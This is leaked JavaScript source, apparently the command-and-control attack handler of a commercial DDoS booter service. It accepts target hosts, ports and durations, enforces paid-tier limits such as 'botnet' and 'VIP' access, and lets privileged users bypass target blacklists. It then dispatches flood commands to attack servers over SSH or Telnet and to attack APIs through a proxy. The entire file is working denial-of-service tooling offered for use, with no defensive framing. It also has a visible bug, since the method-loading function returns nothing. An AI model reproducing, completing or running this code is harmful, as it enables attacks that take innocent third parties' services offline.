// Leaked by Dstat.ST & Elitestress.st :)
const fs = require('fs'),
  path = require('path'),
  axios = require('axios'),
  net = require('net'),
  { ProxyAgent } = require('proxy-agent'),
  { Client } = require('ssh2');

typeof __dirname === 'undefined' && (global.__dirname = path.resolve());
eval(fs.readFileSync(path.join(__dirname, './utils/Base64.js'), 'utf8'));
eval(fs.readFileSync(path.join(__dirname, './utils/Info.js'), 'utf8'));
eval(fs.readFileSync(path.join(__dirname, './utils/AsyncQueue.js'), 'utf8'));

const blacklist = JSON.parse(fs.readFileSync(path.join(__dirname, './configs/blacklist.json')));
const config = JSON.parse(fs.readFileSync(path.join(__dirname, './configs/main.json')));
const agent = new ProxyAgent('http://proxy.zopz-api.com:3128');
const activeGroupSlots = {};

// Check if a group slot is available
function canUseGroupSlot(groupName, maxSlots) {
  if (!activeGroupSlots[groupName]) activeGroupSlots[groupName] = 0;
  return activeGroupSlots[groupName] < maxSlots;
}

// Mark a group slot as used
function markGroupSlotUsed(groupName) {
  activeGroupSlots[groupName] = (activeGroupSlots[groupName] || 0) + 1;
}

// Release a group slot
function releaseGroupSlot(groupName) {
  if (activeGroupSlots[groupName]) {
    activeGroupSlots[groupName]--;
    if (activeGroupSlots[groupName] <= 0) delete activeGroupSlots[groupName];
  }
}

class AttackHandler {
  constructor() {
    this.methods = this.loadmethods();
    this.activeAttacks = new Map();
    this.cooldowns = new Map();
    this.userQueues = new Map();
    this.watchMethodFile();
  }

  // Get or create a user queue
  getUserQueue(username) {
    if (!this.userQueues.has(username)) this.userQueues.set(username, new AsyncQueue());
    return this.userQueues.get(username);
  }

  // Main request processing logic
  async processRequest(methodName, params, user) {
    return await this.getUserQueue(user.username).enqueue(async () => {
      if (!this.methods || typeof this.methods !== 'object') {
        console.log('Failed request for user: ' + user.username + ' - Reason: attack methods not loaded');
        return { error: 'attack methods not loaded' };
      }
      console.log('Processing request for user: ' + user.username);
      const method = this.methods[methodName.toLowerCase()];
      if (!method || !method.enabled) {
        console.log('Failed request for user: ' + user.username + ' - Reason: Method ' + methodName + ' not found or disabled');
        return { error: 'Method ' + methodName + ' not found or disabled' };
      }
      const cooldown = this.isOnCooldown(user.username, methodName);
      if (cooldown) {
        console.log('Failed request for user: ' + user.username + ' - Reason: Cooldown ' + cooldown.remaining + 's');
        return { error: 'Cooldown active for ' + methodName + '. ' + cooldown.remaining + 's remaining' };
      }
      this.setCooldown(user, methodName);
      if (!params || typeof params !== 'object' || !params.host) {
        this.removeCooldown(user, methodName);
        console.log('❌ Failed request for user: ' + user.username + ' - Reason: Invalid parameters');
        return { error: 'Invalid parameters' };
      }
      let hostTrimmed = params.host.trim();
      let hostNoProto = hostTrimmed.replace(/^https?:\/\//, '').split('/')[0].split(':')[0];
      const targetDetails = await globalThis.getTargetDetails(params.host);
      if (!targetDetails) {
        this.removeCooldown(user, methodName);
        console.log('Failed to fetch target details.');
        return { error: 'Failed to fetch target details.' };
      }
      if (this.isValidIp(hostNoProto)) {
        if (blacklist.ip_address.includes(hostNoProto) && !user.blacklistbypass) {
          this.removeCooldown(user, methodName);
          console.log('❌ Failed request for user: ' + user.username + ' - Reason: Blacklisted IP ' + hostNoProto);
          return { error: `Host "${hostNoProto}" is blacklisted` };
        }
        if (!this.isValidNumber(params.port, 1, 65535)) {
          this.removeCooldown(user, methodName);
          console.log('❌ Failed request for user: ' + user.username + ' - Reason: Invalid port');
          return { error: 'Invalid port number' };
        }
        if (method.domain && !method.ipv4) {
          this.removeCooldown(user, methodName);
          console.log('Failed request for user: ' + user.username + ' - Reason: Method is domain only');
          return { error: 'Method is domain only' };
        }
        if (blacklist.asn.includes(targetDetails.asn) && !user.blacklistbypass) {
          this.removeCooldown(user, methodName);
          console.log('Failed request for user: ' + user.username + ' - Reason: Blacklisted ASN ' + targetDetails.asn + ' for IP ' + params.host);
          return { error: `Target ASN (${targetDetails.asn}) is blacklisted` };
        }
      } else {
        const domain = this.getDomain(params.host);
        if (!domain) {
          this.removeCooldown(user, methodName);
          console.log('Failed request for user: ' + user.username + ' - Reason: Invalid domain');
          return { error: 'Invalid domain' };
        }
        if (method.ipv4) {
          this.removeCooldown(user, methodName);
          console.log('Failed request for user: ' + user.username + ' - Reason: Method is ipv4 only');
          return { error: 'Method is ipv4 only' };
        }
        if (!user.blacklistbypass) {
          if (blacklist.domain[domain]) {
            this.removeCooldown(user, methodName);
            console.log('Failed request for user: ' + user.username + ' - Reason: Blacklisted domain ' + params.host);
            return { error: `Host "${params.host}" is blacklisted` };
          }
          for (const tld of blacklist.domain_type) {
            if (domain.endsWith(tld)) {
              this.removeCooldown(user, methodName);
              console.log('Failed request for user: ' + user.username + ' - Reason: Blocked domain type');
              return { error: 'Target domain type is blocked' };
            }
          }
        }
      }
      if (!this.isValidNumber(params.time, 1, user.maxTime)) {
        this.removeCooldown(user, methodName);
        console.log('Failed request for user: ' + user.username + ' - Reason: Invalid time');
        return { error: `Time must be between 1 and ${user.maxTime} seconds` };
      }
      if (params.time > method.maxTime) {
        this.removeCooldown(user, methodName);
        console.log('Failed request for user: ' + user.username + ' - Reason: Time exceeds max allowed');
        return { error: `Time exceeds maximum allowed (${method.maxTime}s)` };
      }
      if (params.time < method.min_time) {
        this.removeCooldown(user, methodName);
        console.log('Failed request for user: ' + user.username + ' - Reason: Time below min allowed');
        return { error: `Time below minimum allowed (${method.min_time}s)` };
      }
      if (method.vip && !user.vip) {
        this.removeCooldown(user, methodName);
        console.log('Failed request for user: ' + user.username + ' - Reason: User lacks VIP');
        return { error: 'User doesn’t have VIP network!!' };
      }
      if (method.homeholder && !user.homeholder) {
        this.removeCooldown(user, methodName);
        console.log('Failed request for user: ' + user.username + ' - Reason: User lacks Home Holder');
        return { error: 'User doesn’t have Home Holder network!!' };
      }
      if (method.botnet && !user.botnet) {
        this.removeCooldown(user, methodName);
        console.log('Failed request for user: ' + user.username + ' - Reason: User lacks botnet');
        return { error: 'User doesn’t have botnet network!!' };
      }
      const duplicateAttack = [...this.activeAttacks.values()].find(a => a.username === user.username && a.params.host === params.host);
      if (duplicateAttack && !user.spambypass) {
        this.removeCooldown(user, methodName);
        const remaining = Math.ceil((duplicateAttack.startTime + duplicateAttack.params.time * 1000 - Date.now()) / 1000);
        console.log('Failed request for user: ' + user.username + ' - Reason: Duplicate attack (' + remaining + 's remaining)');
        return { error: `Ongoing attack to ${params.host} in progress. ${remaining}s remaining` };
      }
      const concurrentMethod = [...this.activeAttacks.values()].filter(a => a.username === user.username && a.method === methodName).length;
      if (concurrentMethod >= method.maxConcurrents) {
        this.removeCooldown(user, methodName);
        console.log('Failed request for user: ' + user.username + ' - Reason: Too many concurrent ' + methodName);
        return { error: `Maximum concurrent reached (${method.maxConcurrents}) for ${methodName}` };
      }
      const concurrentTotal = [...this.activeAttacks.values()].filter(a => a.username === user.username).length;
      if (concurrentTotal >= user.concurrents) {
        this.removeCooldown(user, methodName);
        console.log('Failed request for user: ' + user.username + ' - Reason: Too many total concurrents');
        return { error: `Maximum concurrent reached (${user.concurrents}) for ${user.username}` };
      }
      if (method.group) {
        const group = config.attack_settings.method_groups.find(g => g.name === method.group);
        if (group) {
          const groupName = group.name;
          const maxSlots = group.max_slots;
          if (!canUseGroupSlot(groupName, maxSlots)) {
            this.removeCooldown(user, methodName);
            console.log('Failed request for user: ' + user.username + ' - Reason: group ' + groupName + ' slots full');
            return { error: `The "${groupName}" methods group max attack slots are used (${maxSlots}).` };
          }
          markGroupSlotUsed(groupName);
          const attackTime = parseInt(params.time, 10);
          if (isNaN(attackTime) || attackTime <= 0) {
            this.removeCooldown(user, methodName);
            console.log('Failed request for user: ' + user.username + ' - Reason: Invalid attack time');
            releaseGroupSlot(groupName);
            return { error: 'Invalid attack time specified.' };
          }
          setTimeout(() => {
            releaseGroupSlot(groupName);
          }, attackTime * 1000);
        }
      }
      const requestId = Date.now().toString() + Math.random().toString(36).slice(2, 15);
      this.activeAttacks.set(requestId, {
        id: requestId,
        username: user.username,
        method: methodName,
        params,
        startTime: Date.now()
      });
      setTimeout(() => this.activeAttacks.delete(requestId), params.time * 1000);
      this.sendServerCommand(methodName, params).catch(e => console.error('ServerCmd Error:', e));
      this.sendApiCommand(methodName, params).catch(e => console.error('ApiCmd Error:', e));
      console.log('Successful request for user: ' + user.username);
      return {
        success: true,
        requestId,
        target: {
          host: params.host,
          port: params.port,
          duration: params.time,
          method: methodName,
          time_sent: new Date().toISOString(),
          ...targetDetails
        }
      };
    });
  }

  // Send command to server (SSH/Telnet)
  async sendServerCommand(methodName, params) {
    let successCount = 0;
    const method = this.methods?.[methodName];
    if (!method || !Array.isArray(method.servers)) return successCount;
    const sessionId = params.host.replace(/\./g, '');
    const IAC = 0xff, DO = 0xfd, WILL = 0xfb, WONT = 0xfc, DONT = 0xfe;
    const serverPromises = method.servers.map(server => new Promise(resolve => {
      const command = server.command.replace(/\{\{(\w+)\}\}/g, (_, key) => ({
        session: sessionId,
        host: params.host,
        port: params.port,
        time: params.time,
        len: params.len
      })[key] || '');
      console.log(`[${server.name}] Executing command: ${command}\r`);
      const ports = Array.isArray(server.port) ? server.port : [server.port || (server.type === 'telnet' ? params.port : 22)];
      const tryPort = idx => {
        if (idx >= ports.length) {
          console.error(`[${server.name}] All ${server.type || 'ssh'} port attempts failed\r`);
          return resolve(false);
        }
        const port = ports[idx];
        if (server.type === 'telnet') {
          const socket = new net.Socket();
          let connected = false, gotUsername = false, gotPassword = false, gotCaptcha = false, sentCommand = false;
          const cleanup = () => { socket.removeAllListeners(); socket.destroy(); };
          const globalTimeout = setTimeout(() => {
            console.error(`[${server.name}] Telnet global timeout on port ${port}\r`);
            cleanup();
            tryPort(idx + 1);
          }, 10000);
          socket.setNoDelay(true);
          socket.setTimeout(10000);
          socket.connect(port, server.host, () => {
            connected = true;
            console.log(`[${server.name}] Telnet connected on port ${port}\r`);
            socket.write('\r\n');
          });
          socket.on('data', data => {
            let i = 0;
            while (i < data.length && data[i] === IAC && i + 2 < data.length) {
              const cmd = data[i + 1], opt = data[i + 2];
              if (cmd === DO) socket.write(Buffer.from([IAC, WONT, opt]));
              if (cmd === WILL) socket.write(Buffer.from([IAC, DONT, opt]));
              i += 3;
            }
            const str = data.slice(i).toString('utf8').replace(/\u001b\[[0-9;]*[A-Za-z]/g, '').replace(/\u001b\][^\u0007]*\u0007/g, '');
            if (sentCommand) {
              console.log(`[${server.name}] ↩ ${str.trimEnd()}\r`);
              cleanup();
              clearTimeout(globalTimeout);
              return resolve(true);
            }
            if (!gotUsername && str.includes('Username:')) {
              socket.write(server.username + '\r\n');
              gotUsername = true;
            } else if (!gotPassword && gotUsername && str.includes('Password:')) {
              socket.write(server.password + '\r\n');
              gotPassword = true;
            } else if (!gotCaptcha && gotPassword && /Captcha/i.test(str)) {
              socket.write((params.captcha || server.captcha) + '\r\n');
              gotCaptcha = true;
            } else if (!sentCommand && (str.endsWith('> ') || str.endsWith('$ ') || str.endsWith('\r\n'))) {
              socket.write(command + '\r\n');
              sentCommand = true;
            }
          });
          socket.on('timeout', () => {
            console.error(`[${server.name}] Telnet timeout on port ${port}\r`);
            cleanup();
            clearTimeout(globalTimeout);
            tryPort(idx + 1);
          });
          socket.on('error', err => {
            console.error(`[${server.name}] Telnet error on port ${port}: ${err.message}\r`);
            cleanup();
            clearTimeout(globalTimeout);
            tryPort(idx + 1);
          });
          socket.on('close', hadError => {
            clearTimeout(globalTimeout);
            cleanup();
            if (connected && !hadError) {
              console.log(`[${server.name}] Telnet session closed\r`);
              resolve(true);
            } else if (!hadError) {
              tryPort(idx + 1);
            } else {
              resolve(false);
            }
          });
        } else {
          const ssh = new Client();
          let globalTimeout = setTimeout(() => {
            console.error(`[${server.name}] SSH global timeout on port ${port}\r`);
            ssh.end();
            resolve(false);
          }, 10000);
          ssh.on('ready', () => {
            ssh.exec(command, (err, stream) => {
              if (err) {
                console.error(`[${server.name}] SSH Exec Error: ${err.message}\r`);
                ssh.end();
                clearTimeout(globalTimeout);
                return resolve(false);
              }
              stream.on('close', () => {
                ssh.end();
                clearTimeout(globalTimeout);
                resolve(true);
              }).on('data', data => {
                console.log(`[${server.name}] STDOUT: ${data.toString().trim()}\r`);
              }).stderr.on('data', data => {
                console.error(`[${server.name}] STDERR: ${data.toString().trim()}\r`);
              });
            });
          }).on('error', err => {
            console.error(`[${server.name}] SSH Connection Error on port ${port}: ${err.message}\r`);
            clearTimeout(globalTimeout);
            tryPort(idx + 1);
          }).on('end', () => {
            clearTimeout(globalTimeout);
          }).connect({
            host: server.host,
            port: port,
            username: server.username,
            password: server.password
          });
        }
      };
      tryPort(0);
    }));
    const results = await Promise.allSettled(serverPromises);
    return successCount = results.filter(r => r.status === 'fulfilled' && r.value === true).length, successCount;
  }

  // Send API command (HTTP)
  async sendApiCommand(methodName, params) {
    let successCount = 0;
    const method = this.methods?.[methodName];
    if (!method || !Array.isArray(method.urls)) return successCount;
    const { urls, error } = this.generateApiUrls(methodName, params);
    if (error) return 0;
    for (const url of urls) {
      const start = Date.now();
      try {
        const response = await axios.get(url, {
          httpAgent: agent,
          httpsAgent: agent,
          timeout: 10000,
          headers: {
            'User-Agent': 'Mozilla/5.0 (ZOPZ CNC) V4',
            'Accept': '*/*',
            'Connection': 'keep-alive'
          }
        });
        const elapsed = Date.now() - start;
        console.log(`--- API Response (${response.status === 200 ? 'Success' : 'Failure'}) ---\r`);
        console.log(`URL: ${url}\r`);
        console.log(`Status: ${response.status} ${response.statusText}\r`);
        console.log('Body:', response.data, '\r');
        if (response.status === 200) successCount++;
      } catch (err) {
        const elapsed = Date.now() - start;
        console.error('--- API Request Failed ---\r');
        console.error(`URL: ${url}\r`);
        console.error(`Error: ${err.message}\r`);
        axios.isCancel(err) && console.error('Request was canceled\r');
        err.response && (console.error(`Status: ${err.response.status}\r`), console.error('Body:', err.response.data, '\r'));
      }
    }
    return successCount;
  }

  // Utility: Validate IPv4 address
  isValidIp = ip => /^(25[0-5]|2[0-4]\d|1\d{2}|[1-9]?\d)\.(25[0-5]|2[0-4]\d|1\d{2}|[1-9]?\d)\.(25[0-5]|2[0-4]\d|1\d{2}|[1-9]?\d)\.(25[0-5]|2[0-4]\d|1\d{2}|[1-9]?\d)$/.test(ip);

  // Utility: Validate number in range
  isValidNumber = (val, min, max) => {
    const num = Number(val);
    return Number.isInteger(num) && num >= min && num <= max;
  };

  // Utility: Extract domain from URL
  getDomain(url) {
    try {
      const parsed = new URL(url);
      return parsed.hostname;
    } catch (e) {
      return null;
    }
  }

  // Cooldown logic
  isOnCooldown(username, methodName) {
    const key = username + ':' + methodName;
    const cooldown = this.cooldowns.get(key);
    if (!cooldown) return false;
    const now = Date.now();
    if (now < cooldown.endTime) {
      return { remaining: Math.ceil((cooldown.endTime - now) / 1000) };
    }
    this.cooldowns.delete(key);
    return false;
  }

  setCooldown(user, methodName) {
    if (user.cooldown == 0) return;
    const key = user.username + ':' + methodName;
    const endTime = Date.now() + user.cooldown * 1000;
    this.cooldowns.set(key, { endTime });
  }

  removeCooldown(user, methodName) {
    const key = user.username + ':' + methodName;
    this.cooldowns.delete(key);
  }

  // Generate API URLs for attack
  generateApiUrls(methodName, params) {
    const method = this.methods[methodName];
    if (!method || !method.enabled) {
      return { error: `Endpoint "${methodName}" not found or disabled` };
    }
    const { urls, maxConcurrents } = method;
    const resultUrls = urls.map(u =>
      u.url
        .replace('{host}', encodeURIComponent(params.host))
        .replace('{port}', encodeURIComponent(params.port))
        .replace('{time}', encodeURIComponent(params.time))
    );
    return { urls: resultUrls, maxConcurrents };
  }

  // Load attack methods from file
  loadmethods() {
    this.methods = JSON.parse(fs.readFileSync(path.join(__dirname, './configs/methods.json')));
  }

  // Watch config files for changes and reload
  watchMethodFile() {
    const files = [
      { name: 'methods.json', target: 'methods' },
      { name: 'blacklist.json', target: 'blacklist' },
      { name: 'plans.json', target: 'plans' }
    ];
    files.forEach(({ name, target }) => {
      const filePath = path.join(__dirname, './configs/', name);
      let lastContent = '';
      fs.watchFile(filePath, { interval: 1000 }, (curr, prev) => {
        if (curr.mtime === prev.mtime) return;
        fs.readFile(filePath, 'utf8', (err, content) => {
          if (err) return console.error(`Failed to read ${name}:\r`, err.message);
          if (content === lastContent) return;
          try {
            const parsed = JSON.parse(content);
            this[target] = parsed;
            lastContent = content;
            console.log(`${name} reloaded successfully\r`);
          } catch (e) {
            console.error(`Invalid JSON in ${name}, ignoring update:\r`, e.message);
          }
        });
      });
    });
  }
}

globalThis.AttackHandler = AttackHandler;